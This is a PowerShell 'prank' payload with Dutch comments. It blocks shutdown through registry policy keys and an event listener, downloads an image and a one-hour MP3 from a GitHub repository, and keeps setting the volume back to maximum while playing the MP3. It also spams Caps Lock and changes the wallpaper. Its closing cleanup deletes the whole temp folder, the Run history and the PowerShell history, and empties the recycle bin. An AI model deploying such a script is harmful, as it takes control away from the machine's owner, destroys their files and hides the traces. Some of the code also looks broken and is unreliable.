# Voorkomt afsluiten via het startmenu en Ctrl+Alt+Del
Write-Host "Blokkeren van afsluiten wordt ingeschakeld..."

# Verwijder de opties voor afsluiten en herstarten uit het startmenu
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ShutdownWithoutLogon" -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoClose" -Value 1 -PropertyType DWord -Force

# Registreer een eventlistener om afsluiten actief te annuleren
$Query = @"
<QueryList>
  <Query Id="0" Path="System">
    <Select Path="System">*[System[Provider[@Name='User32'] and (EventID=1074)]]</Select>
  </Query>
</QueryList>
"@

$Action = {
    Write-Host "Afsluitpoging gedetecteerd! Annuleren..."
    Stop-Process -Name "shutdown" -Force -ErrorAction SilentlyContinue
}

Register-ObjectEvent -Query $Query -Action $Action -SourceIdentifier "StopShutdown"
Write-Host "Afsluitbescherming is actief!"

# Download Image
$image = "https://raw.githubusercontent.com/VBV11/Prank/refs/heads/main/John.png"
$i = -join($image,"?dl=1")
iwr $i -O $env:TMP\i.png

# Download MP3 file
$wav = "https://github.com/VBV11/Prank/raw/refs/heads/main/JOHN%20PORK%20IS%20CALLING%20%5B1%20Hour%5D%20%5Bnh4Da0PgacI%5D%20(mp3cut.net).mp3"
iwr $wav -O $env:TMP\s.mp3

# Functie om het bureaublad te minimaliseren
Function Show-Desktop {
    $shell = New-Object -ComObject "Shell.Application"
    $shell.MinimizeAll()
}

# Functie om Caps Lock te spammen tot de muis beweegt
function Pause-Script{
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell
    
    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

# Functie om MP3 af te spelen op maximaal volume
function Play-MP3 {
    Add-Type -AssemblyName presentationCore
    $mediaPlayer = New-Object system.windows.media.mediaplayer
    $mediaPlayer.open("$env:TMP\s.mp3")
    $mediaPlayer.Volume = 1.0  # Zet volume op 100%
    $mediaPlayer.Play()
    while ($true) {
        Start-Sleep -Seconds 1
        $o = New-Object -ComObject WScript.Shell
        for ($i = 0; $i -lt 50; $i++) {
            $o.SendKeys([char] 175)  # Zorgt ervoor dat volume steeds opnieuw naar 100% gaat
        }
    }
}

# Functie om wallpaper te wijzigen
Function Set-WallPaper {
    param (
        [parameter(Mandatory=$True)]
        [string]$Image
    )

    Add-Type -TypeDefinition "@ 
    using System; 
    using System.Runtime.InteropServices;
    public class Params
    { 
        [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
        public static extern int SystemParametersInfo (Int32 uAction, 
                                                       Int32 uParam, 
                                                       String lpvParam, 
                                                       Int32 fuWinIni);
    }
"@ 

    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
    
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

# Zet volume op maximaal
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# Voer alle functies uit
Show-Desktop
Pause-Script
Set-WallPaper -Image "$env:TMP\i.png"
Play-MP3

# Cleanup
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Caps Lock resetten als die aanstaat
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}
